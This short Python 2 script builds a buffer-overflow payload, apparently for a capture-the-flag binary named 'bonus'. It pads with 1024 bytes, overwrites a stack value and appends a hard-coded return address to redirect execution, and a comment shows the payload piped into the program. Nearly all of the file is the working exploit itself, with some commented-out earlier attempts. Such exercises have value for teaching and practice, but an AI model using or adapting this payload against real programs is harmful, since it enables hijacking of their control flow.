import struct
# addr = int("0xffffbbc0", 16)
# ret = struct.pack("I", addr)



addr = ""
padding = "A"*1024
# addr = "BBBB"
# addr = struct.pack("I", 0x8048560 )

addr = "\x60\x85\x04\x08"

padding += "\xe0\xcf\xff\xff" + "B"*24
padding += addr

#  padding += "A"*(1020-828) + addr +"BBBB"

print padding







# python -c 'print "A"*1024 + "\x64\x85\x04\x08"' | ./bonus
